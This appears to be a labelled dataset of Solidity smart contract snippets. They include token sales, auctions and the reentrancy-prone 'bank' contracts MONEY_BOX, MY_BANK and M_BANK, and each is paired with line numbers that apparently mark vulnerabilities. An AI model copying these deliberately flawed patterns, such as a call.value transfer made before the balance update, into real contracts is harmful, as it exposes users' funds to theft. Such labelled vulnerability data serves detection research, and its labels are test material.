    uint256 LOCK_PERIOD_END      = 1588291200;    // Friday, May 1, 2020 12:00:00 AM            12th month done - lock-in period ends
    mapping(address => uint256) public tokensOwed;
    mapping(address => uint256) public ethContribution;
    mapping(address => bool) public isWhitelisted;
    event LogAddedToWhitelist(address indexed _contributor);
    event LogTokenRateUpdated(uint256 _newRate);
    event LogSaleClosed();
    constructor(uint256 _tokeninOneEther) public
    {
        require (_tokeninOneEther > 0);
        isWhitelisted[owner] = true;
        tokeninOneEther = _tokeninOneEther;
        emit LogTokenRateUpdated(_tokeninOneEther);
    }
    function () public payable
    {
        require(!crowdsaleClosed);
        require(isWhitelisted[msg.sender]);
        uint256 amountToSend = msg.value * tokeninOneEther;
        require (tokenSold.add(amountToSend) <= maxTokensToSell);
        tokensOwed[msg.sender] += amountToSend;
        tokenSold += amountToSend;
        ethContribution[msg.sender] += msg.value;
        beneficiary.transfer(address(this).balance);
    }
    function addContributor(address _contributor) external onlyOwner
    {
        require(_contributor != address(0));
        require(!isWhitelisted[_contributor]);
        isWhitelisted[_contributor] = true;
        emit LogAddedToWhitelist(_contributor);
    }
    function updateTokenRate(uint256 _tokeninOneEther ) external onlyOwner
    {
        require (_tokeninOneEther > 0);
        tokeninOneEther = _tokeninOneEther;
        emit LogTokenRateUpdated(_tokeninOneEther);
    }
    function closeSale() external onlyOwner
    {
        require (now > LOCK_PERIOD_START);
        lynT.transfer(msg.sender, lynT.balanceOf(address(this)));
        beneficiary.transfer(address(this).balance);
        crowdsaleClosed = true;
        emit LogSaleClosed();
    }
    function withdrawMyTokens () external
    {
        require (crowdsaleClosed);
        require (tokensOwed[msg.sender] > 0);
        require (now > LOCK_PERIOD_9_MONTH);
        uint256 penalty = 0;
        if(now > LOCK_PERIOD_END)
            penalty = 0;
        else if(now > LOCK_PERIOD_11_MONTH)
            penalty = 20;
        else if(now > LOCK_PERIOD_10_MONTH)
            penalty = 30;
        else
            penalty = 40;
        uint256 tokenBought = tokensOwed[msg.sender];
        uint256 toSend = tokenBought.sub(tokenBought.mul(penalty).div(100));
        tokensOwed[msg.sender] = 0;
        lynT.transfer(msg.sender, toSend);
    }
    function withdrawPenaltyTokens() external onlyOwner
    {
        require (now > LOCK_PERIOD_END);
        lynT.transfer(msg.sender, lynT.balanceOf(address(this)));
        beneficiary.transfer(address(this).balance);
    }
}","[35, 44, 45, 46, 47, 59, 65, 66, 91, 92, 93]"
"            return;
        }
        _;
    }
    constructor() public {
        mapMaster = msg.sender;
        tokens.length++;
        //reserve 0 token - no binding, no sale
        MapLand storage reserve = tokens[tokens.length - 1];
        reserve.owner = msg.sender;
    }
    function setMapMaster(address _mapMaster) public onlyOwner {
        mapMaster = _mapMaster;
    }
    function setMinMargin(uint256 _amount) public onlyOwner {
        minMargin = _amount;
    }
    function setBasePrice(uint256 _amount) public onlyOwner {
        basePrice = _amount;
    }
    function setRegionTax(uint16 regionId, uint8 tax) public onlyRegionOwner(regionId) onlyOnActiveSale {
        require(tax <= 100 && tax >= 0);
        regions[regionId].tax = tax;
        emit TaxUpdate(regionId, regions[regionId].tax);
    }
    function setRegionName(uint16 regionId, string regionName) public onlyOwner {
        regions[regionId].regionName = regionName;
        emit ChangeRegionName(regionId, regionName);
    }
    function setRegionOnSale(uint16 regionId) public onlyMapMaster {
        regions[regionId].onSale = true;
        emit RegionOnSale(regionId);
    }
    function setAllowSellLands(uint16 regionId) public onlyMapMaster {
        regions[regionId].allowSaleLands = true;
        emit RegionAllowSaleLands(regionId);
    }
    function setRegionPrice(uint16 regionId, uint256 price) public onlyOwner {
        if(regions[regionId].owner == address(0) && !regions[regionId].onSale) {
            regions[regionId].startPrice = price;
            emit UpdateRegionPrice(regionId, price);
        }
    }
    function addRegion(uint16 _regionId, uint256 _startPrice, string _regionName) public onlyMapMaster onlyOnActiveSale {
        if (regions[_regionId].created) {
            return;
        }
        Region storage newRegion = regions[_regionId];
        newRegion.startPrice = _startPrice;
        newRegion.tax = defaultRegionTax;
        newRegion.owner = address(0);
        newRegion.regionName = _regionName;
        newRegion.created = true;
        emit AddRegion(_regionId);
    }
    function regionExists(uint16 _regionId) public view returns (bool) {
        return regions[_regionId].created;
    }
    function makeBid(uint16 regionId) payable public
    onlyOnActiveSale
    canMakeBid(regionId) {
        uint256 minimal_bid;
        if (region_bids[regionId].currentBuyer != address(0)) {//If have bid already
            minimal_bid = region_bids[regionId].bid + MINIMAL_RAISE;
        } else {
            minimal_bid = regions[regionId].startPrice;
        }
        if (minimal_bid > msg.value) {
            if (msg.value > 0) {
                msg.sender.transfer(msg.value);
            }
            return;
        }
        RegionBid storage bid = region_bids[regionId];
        if (bid.currentBuyer != address(0)) {
            //Return funds to old buyer
            bid.currentBuyer.transfer(bid.bid);
        } else {
            emit AuctionStarts(regionId);
        }
        // Auction will be active for 7 days if no one make a new bid
        bid.activeTill = now + AUCTION_DURATION;
        bid.currentBuyer = msg.sender;
        bid.bid = msg.value;
        emit RegionNewBid(regionId, msg.sender, msg.value, region_bids[regionId].activeTill);
    }
    function completeRegionAuction(uint16 regionId) public onlyMapMaster {
        if (region_bids[regionId].currentBuyer == address(0)) {
            return;
        }
        if (region_bids[regionId].activeTill > now || region_bids[regionId].activeTill == 0) {
            return;
        }
        transferRegion(regionId, region_bids[regionId].currentBuyer);
    }
    function takeRegion(uint16 regionId) public {
        require(regions[regionId].owner == address(0));
        require(region_bids[regionId].currentBuyer == msg.sender);
        require(region_bids[regionId].activeTill < now);
        transferRegion(regionId, region_bids[regionId].currentBuyer);
    }
    function transferRegion(uint16 regionId, address newOwner) internal {
        regions[regionId].owner = newOwner;
        regions[regionId].onSale = false;
        emit RegionSold(regionId, regions[regionId].owner);
    }
    // returns next minimal bid or final bid on auctions that already end
    function getRegionPrice(uint16 regionId) public view returns (uint256 next_bid) {
        if(regions[regionId].owner != address(0)) {
            return region_bids[regionId].bid;
        }
        if (region_bids[regionId].currentBuyer != address(0)) {//If have bid already
            next_bid = region_bids[regionId].bid + MINIMAL_RAISE;
        } else {
            next_bid = regions[regionId].startPrice;
        }
    }
    function _activateZoneLand(int32 x, int32 y, uint8 region, uint8 resources) internal {
        tokens.length++;
        MapLand storage tmp = tokens[tokens.length - 1];
        tmp.region = region;
        tmp.resources = resources;
        tmp.buyPrice = 0;
        zone[x][y] = tokens.length - 1;
        zone_reverse[tokens.length - 1] = Coordinates(x, y);
        emit ActivateMap(x, y, tokens.length - 1);
    }
    function activateZone(int32[] x, int32[] y, uint8[] region, uint8[] resources) public onlyMapMaster {",[64]
"pragma solidity ^0.4.19;
contract MONEY_BOX   
{
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    uint public MinSum;
    Log LogFile;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        LogFile = Log(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Put(uint _lockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[44, 46, 48]"
"	// функция смены адреса ETH куда будут поступать отправленные эфиры
    function setBeneficiaryAddress(address _new) public onlyOwner {
        beneficiary = _new;
    }
    // функция установки стоимости одного токена в wei
    function setTokenPrice(uint _price) public onlyOwner {
        tokenPrice = _price;
    }
    // фукнция списания токенов с общего баланса на баланс отправителя
	function transferPayable(address _address, uint _amount) private returns (bool) {
	    accounts[_address] = safeAdd(accounts[_address], _amount);
	    accounts[owner] = safeSub(accounts[owner], _amount);
	    totalSold = safeAdd(totalSold, _amount);
	    return true;
	}
	// вычисления количество токенов, равное количество отправленных эфиров
	// исходя из стоимости токена, бонуса и скидки
	function get_tokens_count(uint _amount) private returns (uint) {
	     uint currentPrice = tokenPrice;
	     uint tokens = safeDiv( safeMul(_amount, _decimals), currentPrice ) ;
	     totalSold = safeAdd(totalSold, tokens);
	     if(currentState == State.PRE_ICO) {
	         tokens = safeAdd(tokens, get_bounce_tokens(tokens)); // вызывается при PRE-ICO
	     } else if(currentState == State.ICO) {
	         tokens = safeAdd(tokens, get_discount_tokens(tokens)); // вызывается при ICO
	     }
	     return tokens;
	}
	// вычисление текущей скидки
	function get_discount_tokens(uint _tokens) isAllowedBounce private returns (uint) {
	    uint tokens = 0;
	    uint _current_percent = safeMul(current_discount, 100);
	    tokens = _tokens * _current_percent / 10000;
	    totalBounces = safeAdd(totalBounces, tokens);
	    return tokens;
	}
	// вычисление бонусных токенов
	function get_bounce_tokens(uint _tokens) isAllowedBounce() private returns (uint) {
	    uint tokens = 0;
	    uint _current_percent = safeMul(current_percent, 100);
	    tokens = _tokens * _current_percent / 10000;
	    totalBounces = safeAdd(totalBounces, tokens);
	    return tokens;
	}
	// функция, которая вызывается при отправке эфира на контракт
	function buy() public saleIsOn() minAmount() payable {
	    uint tokens;
	    tokens = get_tokens_count(msg.value);
		require(transferPayable(msg.sender , tokens));
		if(_allowedTransfers) {
			beneficiary.transfer(msg.value);
			balances[msg.sender] = safeAdd(balances[msg.sender], msg.value);
			balancesKeys.push(msg.sender);
	    }
	}
	// возврат средств, вызывается владельцем контракта,
	// для возврата на контракте должны присутствовать эфиры
	function refund() onlyOwner {
      for(uint i = 0 ; i < balancesKeys.length ; i++) {
          address addr = balancesKeys[i];
          uint value = balances[addr];
          balances[addr] = 0;
          accounts[addr] = 0;
          addr.transfer(value);
      }
    }
	function() external payable {
      buy();
    }
}",[64]
"    uint256 public constant PRESALE_END_DATE = 1522173600;
	// Limit 30% Bonus 2018-02-18T00:00:00+00:00 in ISO 8601
	//uint256 public constant PRESALE_30BONUS_END = 1518912000;  // for reference only
	// Limit 15% Bonus 2018-03-09T00:00:00+00:00 in ISO 8601
	//uint256 public constant PRESALE_15BONUS_END = 1520553000;  // for reference only
    // Owner can clawback after a date in the future, so no ethers remain
    // trapped in the contract. This will only be relevant if the
    // minimum funding level is not reached
    // 2018-04-27T00:00:00+00:00 in ISO 8601
    uint256 public constant OWNER_CLAWBACK_DATE = 1524787200;
    /// @notice Keep track of all participants contributions, including both the
    ///         preallocation and public phases
    /// @dev Name complies with ERC20 token standard, etherscan for example will recognize
    ///      this and show the balances of the address
    mapping (address => uint256) public balanceOf;
    /// @notice Log an event for each funding contributed during the public phase
    /// @notice Events are not logged when the constructor is being executed during
    ///         deployment, so the preallocations will not be logged
    event LogParticipation(address indexed sender, uint256 value, uint256 timestamp);
    function MXLPresale () public payable {
		// no preallocated
        //assertEquals(TOTAL_PREALLOCATION, msg.value);
        // Pre-allocations
        //addBalance(0xe902741cD4666E4023b7E3AB46D3DE2985c996f1, 0.647 ether);
        //addBalance(0x98aB52E249646cA2b013aF8F2E411bB90C1c9b4d, 66.98333494 ether);
        //addBalance(0x96050f871811344Dd44C2F5b7bc9741Dff296f5e, 10 ether);
        //assertEquals(TOTAL_PREALLOCATION, totalFunding);
    }
    /// @notice A participant sends a contribution to the contract's address
    ///         between the PRESALE_STATE_DATE and the PRESALE_END_DATE
    /// @notice Only contributions between the MINIMUM_PARTICIPATION_AMOUNT and
    ///         MAXIMUM_PARTICIPATION_AMOUNT are accepted. Otherwise the transaction
    ///         is rejected and contributed amount is returned to the participant's
    ///         account
    /// @notice A participant's contribution will be rejected if the pre sale
    ///         has been funded to the maximum amount
    function () public payable {
        // A participant cannot send funds before the pre sale start date
        if (now < PRESALE_START_DATE) revert();
        // A participant cannot send funds after the pre sale end date
        if (now > PRESALE_END_DATE) revert();
        // A participant cannot send less than the minimum amount
        if (msg.value < MINIMUM_PARTICIPATION_AMOUNT) revert();
        // A participant cannot send more than the maximum amount
        if (msg.value > MAXIMUM_PARTICIPATION_AMOUNT) revert();
        // A participant cannot send funds if the pres ale has been reached the maximum
        // funding amount
        if (safeIncrement(totalFunding, msg.value) > PRESALE_MAXIMUM_FUNDING) revert();
        // Register the participant's contribution
        addBalance(msg.sender, msg.value);
    }
    /// @notice The owner can withdraw ethers already during pre sale,
    ///         only if the minimum funding level has been reached
    function ownerWithdraw(uint256 _value) external onlyOwner {
        // The owner cannot withdraw if the pre sale did not reach the minimum funding amount
        if (totalFunding < PRESALE_MINIMUM_FUNDING) revert();
        // Withdraw the amount requested
        if (!owner.send(_value)) revert();
    }
    /// @notice The participant will need to withdraw their funds from this contract if
    ///         the pre sale has not achieved the minimum funding level
    function participantWithdrawIfMinimumFundingNotReached(uint256 _value) external {
        // Participant cannot withdraw before the pre sale ends
        if (now <= PRESALE_END_DATE) revert();
        // Participant cannot withdraw if the minimum funding amount has been reached
        if (totalFunding >= PRESALE_MINIMUM_FUNDING) revert();
        // Participant can only withdraw an amount up to their contributed balance
        if (balanceOf[msg.sender] < _value) revert();
        // Participant's balance is reduced by the claimed amount.
        balanceOf[msg.sender] = safeDecrement(balanceOf[msg.sender], _value);
        // Send ethers back to the participant's account
        if (!msg.sender.send(_value)) revert();
    }
    /// @notice The owner can clawback any ethers after a date in the future, so no
    ///         ethers remain trapped in this contract. This will only be relevant
    ///         if the minimum funding level is not reached
    function ownerClawback() external onlyOwner {
        // The owner cannot withdraw before the clawback date
        if (now < OWNER_CLAWBACK_DATE) revert();
        // Send remaining funds back to the owner
        if (!owner.send(this.balance)) revert();
    }
    /// @dev Keep track of participants contributions and the total funding amount
    function addBalance(address participant, uint256 value) private {
        // Participant's balance is increased by the sent amount
        balanceOf[participant] = safeIncrement(balanceOf[participant], value);
        // Keep track of the total funding amount
        totalFunding = safeIncrement(totalFunding, value);
        // Log an event of the participant's contribution
        LogParticipation(participant, value, now);
    }
    /// @dev Throw an exception if the amounts are not equal
    function assertEquals(uint256 expectedValue, uint256 actualValue) private pure {
        if (expectedValue != actualValue) revert();
    }
    /// @dev Add a number to a base value. Detect overflows by checking the result is larger
    ///      than the original base value.
    function safeIncrement(uint256 base, uint256 increment) private pure returns (uint256) {
        uint256 result = base + increment;
        if (result < base) revert();
        return result;
    }
    /// @dev Subtract a number from a base value. Detect underflows by checking that the result
    ///      is smaller than the original base value
    function safeDecrement(uint256 base, uint256 increment) private pure returns (uint256) {
        uint256 result = base - increment;
        if (result > base) revert();
        return result;
    }
}",[64]
"pragma solidity ^0.4.25;
contract MY_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function MY_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract M_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function M_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"        return now >= startSale && now <= endSale;
    }
    function () public payable isUnderHardCap {
        require(isMainSale());
        require(isWhitelisted(msg.sender));
        require(msg.value >= 10000000000000000);
        mainSale(msg.sender, msg.value);
        investedEther[msg.sender] = investedEther[msg.sender].add(msg.value);
    }
    function mainSale(address _investor, uint256 _value) internal {
        uint256 tokens = _value.mul(1e18).div(buyPrice);
        uint256 tokensSum = tokens.mul(discountSum(msg.value)).div(100);
        uint256 tokensCollect = tokens.mul(discountCollect()).div(100);
        tokens = tokens.add(tokensSum).add(tokensCollect);
        token.mintFromICO(_investor, tokens);
        uint256 tokensFounders = tokens.mul(5).div(12);
        token.mintFromICO(team, tokensFounders);
        uint256 tokensDevelopers = tokens.div(4);
        token.mintFromICO(reserve, tokensDevelopers);
        weisRaised = weisRaised.add(msg.value);
        uint256 valueInUSD = msg.value.mul(dollarPrice);
        dollarRaised = dollarRaised.add(valueInUSD);
        soldTokens = soldTokens.add(tokens);
    }
    function discountSum(uint256 _tokens) pure private returns(uint256) {
        if(_tokens >= 10000000*1e18) { // > 100k$ = 10,000,000 TAL
            return 7;
        }
        if(_tokens >= 5000000*1e18) { // 50-100k$ = 5,000,000 TAL
            return 5;
        }
        if(_tokens >= 1000000*1e18) { // 10-50k$ = 1,000,000 TAL
            return 3;
        } else
            return 0;
    }
    function discountCollect() view private returns(uint256) {
        // 20% bonus, if collected sum < 3 mln $
        if(dollarRaised <= step1Sum) {
            return 20;
        } // 15% bonus, if collected sum < 10 mln $
        if(dollarRaised <= step2Sum) {
            return 15;
        } // 10% bonus, if collected sum < 20 mln $
        if(dollarRaised <= step3Sum) {
            return 10;
        } // 5% bonus, if collected sum < 30 mln $
        if(dollarRaised <= step4Sum) {
            return 5;
        }
        return 0;
    }
    function mintManual(address _investor, uint256 _value) public onlyOwner {
        token.mintFromICO(_investor, _value);
        uint256 tokensFounders = _value.mul(5).div(12);
        token.mintFromICO(team, tokensFounders);
        uint256 tokensDevelopers = _value.div(4);
        token.mintFromICO(reserve, tokensDevelopers);
    }
    function transferEthFromContract(address _to, uint256 amount) public onlyOwner {
        require(amount != 0);
        require(_to != 0x0);
        _to.transfer(amount);
    }
    function refundSale() public {
        require(soldTokens < softCap && now > endSale);
        uint256 rate = investedEther[msg.sender];
        require(investedEther[msg.sender] >= 0);
        investedEther[msg.sender] = 0;
        msg.sender.transfer(rate);
        weisRaised = weisRaised.sub(rate);
        emit Refund(rate, msg.sender);
    }
}","[63, 66]"
"		nTokens[_symbol]=nToken;
		TokenDeployed(nToken, _name, _symbol);
		return nToken;
	}
	function depositNonNative(string _symbol,address _to,uint256 _amount) public onlyAdmin(2){
		require(nTokens[_symbol] != address(0));
		nonNativeToken_Interface(nTokens[_symbol]).makeDeposit(_to, _amount);
		nonNativeDeposit(_symbol, _to, _amount);
	}
	function withdrawNonNative(string _symbol,address _from,uint256 _amount) public onlyAdmin(2){
		require(nTokens[_symbol] != address(0));
		nonNativeToken_Interface(nTokens[_symbol]).makeWithdrawal(_from, _amount);
		nonNativeWithdrawal(_symbol, _from, _amount);
	}
	function getTokenAddress(string _symbol) public constant returns(address tokenAddress){
		return nTokens[_symbol];
	}
}
contract EtherStore is Managable{
	bool public WrapperisEnabled;
	address public EtherWrapper;
	modifier WrapperEnabled{
		require(WrapperisEnabled);
		_;
	}
	modifier PreWrapper{
		require(!WrapperisEnabled);
		_;
		WrapperSetup(EtherWrapper);
		WrapperisEnabled=true;
	}
	event WrapperSetup(address _wrapper);
	event WrapperChanged(address _from, address _to);
	event EtherDeposit(address _to, uint256 _amount);
	event EtherWithdrawal(address _from, uint256 _amount);
	function EtherStore() Managable() public {
		WrapperisEnabled=false;
	}
	function setupWrapper(address _wrapper) public onlyAdmin(2) PreWrapper{
		EtherWrapper=_wrapper;
	}
	function deployWrapper() public onlyAdmin(2) PreWrapper{
		EtherWrapper = new EthWrapper('EtherWrapper', 'ETH', 18);
	}
	function changeWrapper(address _wrapper) public onlyAdmin(2) WrapperEnabled{
		EthWrapper_Interface(EtherWrapper).wrapperChanged.value(this.balance)();
		WrapperChanged(EtherWrapper, _wrapper);
		EtherWrapper = _wrapper;
	}
	function deposit() public payable WrapperEnabled{
		require(EthWrapper_Interface(EtherWrapper).makeDeposit(msg.sender, msg.value));
		EtherDeposit(msg.sender,msg.value);
	}
	function depositTo(address _to) public payable WrapperEnabled{
		require(EthWrapper_Interface(EtherWrapper).makeDeposit(_to, msg.value));
		EtherDeposit(_to,msg.value);
	}
	function () public payable {
		deposit();
	}
	function withdraw(uint _amount) public WrapperEnabled{
		require(EthWrapper_Interface(EtherWrapper).balanceOf(msg.sender) >= _amount);
		require(EthWrapper_Interface(EtherWrapper).makeWithdrawal(msg.sender, _amount));
		msg.sender.transfer(_amount);
		EtherWithdrawal(msg.sender, _amount);
	}
	function withdrawTo(address _to,uint256 _amount) public WrapperEnabled{
		require(EthWrapper_Interface(EtherWrapper).balanceOf(msg.sender) >= _amount);
		require(EthWrapper_Interface(EtherWrapper).makeWithdrawal(msg.sender, _amount));
		_to.transfer(_amount);
		EtherWithdrawal(_to, _amount);
	}
}
contract Mergex is EtherStore{
	using SafeMath for uint256;
	mapping(address => mapping(bytes32 => uint256)) public fills;
	event Trade(bytes32 hash, address tokenA, address tokenB, uint valueA, uint valueB);
	event Filled(bytes32 hash);
	event Cancel(bytes32 hash);
	function Mergex() EtherStore() public {
	}
	function checkAllowance(address token, address owner, uint256 amount) internal constant returns (bool allowed){
		return ERC20_Interface(token).allowance(owner,address(this)) >= amount;
	}
	function getFillValue(address owner, bytes32 hash) public view returns (uint filled){
		return fills[owner][hash];
	}
	function fillOrder(address owner, address tokenA, address tokenB, uint tradeAmount, uint valueA, uint valueB, uint expiration, uint nonce, uint8 v, bytes32 r, bytes32 s) public{
		bytes32 hash=sha256('mergex',owner,tokenA,tokenB,valueA,valueB,expiration,nonce);
		if(validateOrder(owner,hash,expiration,tradeAmount,valueA,v,r,s)){
			if(!tradeTokens(hash, msg.sender, owner, tokenA, tokenB, tradeAmount, valueA, valueB)){
				revert();
			}
			fills[owner][hash]=fills[owner][hash].add(tradeAmount);
			if(fills[owner][hash] == valueA){
				Filled(hash);
			}
		}
	}
	function validateOrder(address owner, bytes32 hash, uint expiration, uint tradeAmount, uint Value, uint8 v, bytes32 r, bytes32 s) internal constant returns(bool success){
		require(fills[owner][hash].add(tradeAmount) <= Value);
		require(block.number<=expiration);
		require(ecrecover(keccak256(""\x19Ethereum Signed Message:\n32"",hash),v,r,s)==owner);
		return true;
	}
	function cancelOrder(address tokenA, address tokenB, uint valueA, uint valueB, uint expiration, uint nonce, uint8 v, bytes32 r, bytes32 s) public{
		bytes32 hash=sha256('mergex', msg.sender, tokenA, tokenB, valueA, valueB, expiration, nonce);
		require(block.number<=expiration);
		require(ecrecover(keccak256(""\x19Ethereum Signed Message:\n32"",hash),v,r,s)==msg.sender);
		Cancel(hash);
		fills[msg.sender][hash]=valueA;
	}
	function tradeTokens(bytes32 hash, address userA,address userB,address tokenA,address tokenB,uint amountA,uint valueA,uint valueB) internal returns(bool success){
		uint amountB=valueB.mul(amountA).div(valueA);
		require(ERC20_Interface(tokenA).balanceOf(userA)>=amountA);
		require(ERC20_Interface(tokenB).balanceOf(userB)>=amountB);
		if(!checkAllowance(tokenA, userA, amountA))return false;
		if(!checkAllowance(tokenB, userB, amountB))return false;
		uint feeA=amountA.mul(feePercent).div(10000);
		uint feeB=amountB.mul(feePercent).div(10000);
		uint tradeA=amountA.sub(feeA);
		uint tradeB=amountB.sub(feeB);
		if(!ERC20_Interface(tokenA).transferFrom(userA,userB,tradeA))return false;
		if(!ERC20_Interface(tokenB).transferFrom(userB,userA,tradeB))return false;
		if(!ERC20_Interface(tokenA).transferFrom(userA,feeAddress,feeA))return false;
		if(!ERC20_Interface(tokenB).transferFrom(userB,feeAddress,feeB))return false;
		Trade(hash, tokenA, tokenB, amountA, amountB);
		return true;",[64]
"pragma solidity ^0.5.8;
contract ERC20Interface {
    function name() public view returns (string memory);
    function symbol() public view returns (string memory);
    function decimals() public view returns (uint8);
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    function burn(uint256 amount) public;
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
contract MerkleDrop {
    bytes32 public root;
    ERC20Interface public droppedToken;
    uint public decayStartTime;
    uint public decayDurationInSeconds;
    uint public initialBalance;
    uint public remainingValue;  // The total of not withdrawn entitlements, not considering decay
    uint public spentTokens;  // The total tokens spent by the contract, burnt or withdrawn
    mapping (address => bool) public withdrawn;
    event Withdraw(address recipient, uint value, uint originalValue);
    event Burn(uint value);
    constructor(ERC20Interface _droppedToken, uint _initialBalance, bytes32 _root, uint _decayStartTime, uint _decayDurationInSeconds) public {
        // The _initialBalance should be equal to the sum of airdropped tokens
        droppedToken = _droppedToken;
        initialBalance = _initialBalance;
        remainingValue = _initialBalance;
        root = _root;
        decayStartTime = _decayStartTime;
        decayDurationInSeconds = _decayDurationInSeconds;
    }
    function withdraw(uint value, bytes32[] memory proof) public {
        require(verifyEntitled(msg.sender, value, proof), ""The proof could not be verified."");
        require(! withdrawn[msg.sender], ""You have already withdrawn your entitled token."");
        burnUnusableTokens();
        uint valueToSend = decayedEntitlementAtTime(value, now, false);
        assert(valueToSend <= value);
        require(droppedToken.balanceOf(address(this)) >= valueToSend, ""The MerkleDrop does not have tokens to drop yet / anymore."");
        require(valueToSend != 0, ""The decayed entitled value is now zero."");
        withdrawn[msg.sender] = true;
        remainingValue -= value;
        spentTokens += valueToSend;
        require(droppedToken.transfer(msg.sender, valueToSend));
        emit Withdraw(msg.sender, valueToSend, value);
    }
    function verifyEntitled(address recipient, uint value, bytes32[] memory proof) public view returns (bool) {
        // We need to pack the 20 bytes address to the 32 bytes value
        // to match with the proof made with the python merkle-drop package
        bytes32 leaf = keccak256(abi.encodePacked(recipient, value));
        return verifyProof(leaf, proof);
    }
    function decayedEntitlementAtTime(uint value, uint time, bool roundUp) public view returns (uint) {
        if (time <= decayStartTime) {
            return value;
        } else if (time >= decayStartTime + decayDurationInSeconds) {
            return 0;
        } else {
            uint timeDecayed = time - decayStartTime;
            uint valueDecay = decay(value, timeDecayed, decayDurationInSeconds, !roundUp);
            assert(valueDecay <= value);
            return value - valueDecay;
        }
    }
    function burnUnusableTokens() public {
        if (now <= decayStartTime) {
            return;
        }
        // The amount of tokens that should be held within the contract after burning
        uint targetBalance = decayedEntitlementAtTime(remainingValue, now, true);
        // toBurn = (initial balance - target balance) - what we already removed from initial balance
        uint currentBalance = initialBalance - spentTokens;
        assert(targetBalance <= currentBalance);
        uint toBurn = currentBalance - targetBalance;
        spentTokens += toBurn;
        burn(toBurn);
    }
    function deleteContract() public {
        require(now >= decayStartTime + decayDurationInSeconds, ""The storage cannot be deleted before the end of the merkle drop."");
        burnUnusableTokens();
        selfdestruct(address(0));
    }
    function verifyProof(bytes32 leaf, bytes32[] memory proof) internal view returns (bool) {
        bytes32 currentHash = leaf;
        for (uint i = 0; i < proof.length; i += 1) {
            currentHash = parentHash(currentHash, proof[i]);
        }
        return currentHash == root;
    }
    function parentHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        if (a < b) {
            return keccak256(abi.encode(a, b));
        } else {
            return keccak256(abi.encode(b, a));
        }
    }
    function burn(uint value) internal {
        if (value == 0) {
            return;
        }
        emit Burn(value);
        droppedToken.burn(value);
    }
    function decay(uint value, uint timeToDecay, uint totalDecayTime, bool roundUp) internal pure returns (uint) {
        uint decay;
        if (roundUp) {
            decay = (value*timeToDecay+totalDecayTime-1)/totalDecayTime;
        } else {
            decay = value*timeToDecay/totalDecayTime;
        }
        return decay >= value ? value : decay;
    }
}","[81, 84]"
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
